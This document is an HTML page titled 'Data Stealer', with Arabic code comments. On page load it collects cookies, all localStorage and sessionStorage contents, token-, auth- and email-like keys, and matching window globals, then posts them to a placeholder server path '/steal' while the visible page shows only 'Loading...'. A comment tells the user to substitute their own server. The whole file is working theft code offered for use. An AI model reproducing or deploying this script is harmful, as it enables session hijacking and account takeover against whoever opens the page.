<!DOCTYPE html>
<html>
<head>
  <title>Data Stealer</title>
  <script>
    window.onload = function() {
      try {
        // جمع معلومات أساسية
        const url = location.href;
        const userAgent = navigator.userAgent;
        const cookies = document.cookie || "No cookies";

        // جمع بيانات localStorage
        const localStorageData = {};
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          localStorageData[key] = localStorage.getItem(key);
        }

        // جمع بيانات sessionStorage
        const sessionStorageData = {};
        for (let i = 0; i < sessionStorage.length; i++) {
          const key = sessionStorage.key(i);
          sessionStorageData[key] = sessionStorage.getItem(key);
        }

        // تصفية المفاتيح المحتملة التي تحتوي على توكنات أو ايميل
        const sensitiveData = {};
        const allKeys = [...Object.keys(localStorageData), ...Object.keys(sessionStorageData)];
        allKeys.forEach(key => {
          if (/token|auth|bearer|email|user/i.test(key)) {
            sensitiveData[key] = localStorageData[key] || sessionStorageData[key];
          }
        });

        // محاولة الحصول على أي متغيرات حساسة في نافذة الجافاسكريبت
        const sensitiveGlobals = {};
        for (const key in window) {
          if (/token|auth|user|email/i.test(key) && typeof window[key] === 'string') {
            sensitiveGlobals[key] = window[key];
          }
        }

        // تجهيز البيانات لإرسالها
        const dataToSend = {
          url,
          userAgent,
          cookies,
          localStorageData,
          sessionStorageData,
          sensitiveData,
          sensitiveGlobals
        };

        // إرسال البيانات إلى سيرفرك (غيّر الرابط لسيرفرك الخاص)
        fetch('https://YOUR_SERVER_DOMAIN/steal', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(dataToSend)
        }).catch(e => console.error('Failed to send data:', e));

      } catch (error) {
        console.error('Error in stealing data:', error);
      }
    };
  </script>
</head>
<body>
  <h1>Loading...</h1>
</body>
</html>
